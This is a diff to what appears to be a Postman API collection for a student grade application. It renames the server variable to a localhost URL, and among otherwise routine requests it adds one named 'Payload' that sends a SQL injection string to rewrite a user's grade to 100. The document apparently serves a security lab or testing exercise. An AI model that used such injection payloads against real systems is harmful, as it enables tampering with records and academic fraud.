@@ -30,9 +30,9 @@
 							}
 						},
 						"url": {
-							"raw": "{{addr}}/api/admin/student",
+							"raw": "{{server_url}}/api/admin/student",
 							"host": [
-								"{{addr}}"
+								"{{server_url}}"
 							],
 							"path": [
 								"api",
@@ -55,9 +55,9 @@
 							}
 						],
 						"url": {
-							"raw": "{{addr}}/dashboard",
+							"raw": "{{server_url}}/dashboard",
 							"host": [
-								"{{addr}}"
+								"{{server_url}}"
 							],
 							"path": [
 								"dashboard"
@@ -78,9 +78,9 @@
 							}
 						],
 						"url": {
-							"raw": "{{addr}}",
+							"raw": "{{server_url}}",
 							"host": [
-								"{{addr}}"
+								"{{server_url}}"
 							]
 						}
 					},
@@ -97,9 +97,9 @@
 						"method": "GET",
 						"header": [],
 						"url": {
-							"raw": "{{addr}}/api/grade",
+							"raw": "{{server_url}}/api/grade",
 							"host": [
-								"{{addr}}"
+								"{{server_url}}"
 							],
 							"path": [
 								"api",
@@ -129,9 +129,9 @@
 							}
 						},
 						"url": {
-							"raw": "{{addr}}/api/id/signin",
+							"raw": "{{server_url}}/api/id/signin",
 							"host": [
-								"{{addr}}"
+								"{{server_url}}"
 							],
 							"path": [
 								"api",
@@ -152,9 +152,31 @@
 							"raw": "pobrillant"
 						},
 						"url": {
-							"raw": "{{addr}}/api/student",
+							"raw": "{{server_url}}/api/student",
 							"host": [
-								"{{addr}}"
+								"{{server_url}}"
+							],
+							"path": [
+								"api",
+								"student"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "Payload",
+					"request": {
+						"method": "PUT",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "pobrillant'; UPDATE MGRADE SET GRADE = 100 WHERE USER_ID = 23 --"
+						},
+						"url": {
+							"raw": "{{server_url}}/api/student",
+							"host": [
+								"{{server_url}}"
 							],
 							"path": [
 								"api",
@@ -172,9 +194,9 @@
 				"method": "GET",
 				"header": [],
 				"url": {
-					"raw": "{{addr}}/hello",
+					"raw": "{{server_url}}/hello",
 					"host": [
-						"{{addr}}"
+						"{{server_url}}"
 					],
 					"path": [
 						"hello"
@@ -182,6 +204,33 @@
 				}
 			},
 			"response": []
+		}
+	],
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"exec": [
+					""
+				]
+			}
+		}
+	],
+	"variable": [
+		{
+			"key": "server_url",
+			"value": "http://localhost:8080",
+			"type": "string"
 		}
 	]
 }
